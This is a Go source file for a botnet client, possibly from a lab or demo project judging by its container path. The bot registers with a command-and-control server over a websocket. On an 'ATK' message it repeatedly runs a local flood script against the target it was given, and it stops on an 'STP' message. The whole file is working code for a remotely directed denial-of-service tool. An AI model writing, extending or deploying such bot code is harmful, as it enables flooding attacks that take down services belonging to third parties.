package bot

import (
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"strings"

	"github.com/gorilla/websocket"
)

type Message struct {
	Payload string `json:"payload"`
	From    string `json:"from"`
}

const (
	SIGNAL_ATK = "ATK"
	SIGNAL_STP = "STP"
)

type Bot struct {
	Addr   string
	Master string
	Conn   *websocket.Conn
	Stop   chan struct{} // Concurrent listener to not block WS listener
}

func NewBot(addr, master string) *Bot {
	return &Bot{Addr: addr, Master: master, Stop: make(chan struct{})}
}

// Attempts to establish a WS connection with the C2 layer
func (b *Bot) Connect() error {
	conn, _, err := websocket.DefaultDialer.Dial(b.Master, nil) // For simplicity: C2 treats this as registration
	if err != nil {
		return err // Let's skip retrying connections
	}

	b.Conn = conn
	return nil
}

// Handler function to execute local scripts depending on received signal from C2 layer
func (b *Bot) Execute(fpath string, args string) error {
	args = strings.TrimSpace(args)
	if args == "" {
		return fmt.Errorf("[×] Failed to execute %s: No args received!", fpath)
	}

	// TODO: Also validate valid address

	cmd := exec.Command("bash", fpath, args)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("[×] Failed during exection of %s: %s", fpath, output)
		return err
	}

	log.Printf("[✓] Executed %s:\n%s\n----------------\n", fpath, output)
	return nil
}

// Websocket Loop that continuously listens to signals from the C2 layer, staying active
func (b *Bot) Listen() error {
	defer b.Conn.Close()
	log.Printf("[+] Connected to C2 as %s", b.Addr)

	for {
		_, data, err := b.Conn.ReadMessage()
		if err != nil {
			return err
		}

		var msg Message
		if err := json.Unmarshal(data, &msg); err != nil {
			log.Printf("Invalid message: %v", err)
			continue
		}

		log.Printf("[C] Received: %s", msg.Payload)
		if strings.HasPrefix(msg.Payload, SIGNAL_ATK) {
			target := strings.Split(msg.Payload, SIGNAL_ATK)[1]
			stop := b.Stop

			go func() { // Starts attack concurrently
				for {
					select {
					case <-stop: // Received stop signal
						return

					default:
						if err := b.Execute("/app/bot/flood.sh", target); err != nil { // NOTE: absolute path within container
							// log.Printf(err.Error()) // Commented out to reduce noise in terminal

							continue // Simplest way to just force attacks
						}
					}
				}
			}()

		}

		if msg.Payload == SIGNAL_STP {
			select {
			case <-b.Stop:
				// Already stopped
			default:
				close(b.Stop) // Trigger attack termination
			}

			b.Stop = make(chan struct{})
		}
	}
}

func (b *Bot) Run() error {
	if err := b.Connect(); err != nil {
		return err
	}

	return b.Listen()
}
